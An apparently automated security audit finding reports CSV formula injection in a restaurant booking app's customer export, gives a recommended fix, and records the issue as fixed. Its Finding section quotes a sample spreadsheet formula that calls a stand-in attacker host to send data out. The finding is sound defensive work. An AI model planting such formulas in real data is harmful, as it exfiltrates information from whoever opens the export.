# [MEDIUM] Customer CSV export allows spreadsheet formula injection

**File:** [`src/components/features/customers/ExportCustomersButton.tsx`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/src/components/features/customers/ExportCustomersButton.tsx#L79-L100) (lines 79, 90, 100)
**Project:** nabatableLP
**Severity:** MEDIUM • **Confidence:** high • **Slug:** `other-csv-formula-injection`

## Owners

**Suggested assignee:** `159779640+amanshresthaa@users.noreply.github.com` _(via last-committer)_

## Finding

The export button downloads /api/ops/customers/export and saves the returned CSV directly. Tracing the endpoint shows the export includes customer-controlled fields such as Name, Email, and Phone via generateCSV, while lib/export/csv.ts only quotes commas, quotes, and newlines and does not neutralize leading formula characters. Guest names are user-controlled through the public booking schema and persisted to customers.full_name, so an attacker can book with a name like =WEBSERVICE("https://attacker.example/"&A1). When staff export guests and open the CSV in Excel/Sheets/LibreOffice, the cell can be interpreted as a formula, causing external requests or data exfiltration depending on the spreadsheet client.

## Recommendation

Neutralize spreadsheet formulas in the shared CSV escaping path before export, for example by prefixing an apostrophe to fields whose trimmed value starts with =, +, -, @, tab, CR, or LF, then apply normal CSV quoting. Add regression tests covering exported guest names and other free-text fields.

## Revalidation

**Verdict:** fixed

`lib/export/csv.ts` neutralizes formula-leading values in `escapeCSVField` before quoting, and both customers and bookings export routes use `generateCSV`. Covered by `tests/lib/csv-export.test.ts`.

## Recent committers (`git log`)

- amanshresthaa <159779640+amanshresthaa@users.noreply.github.com> (2026-05-01)
- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2026-02-06)
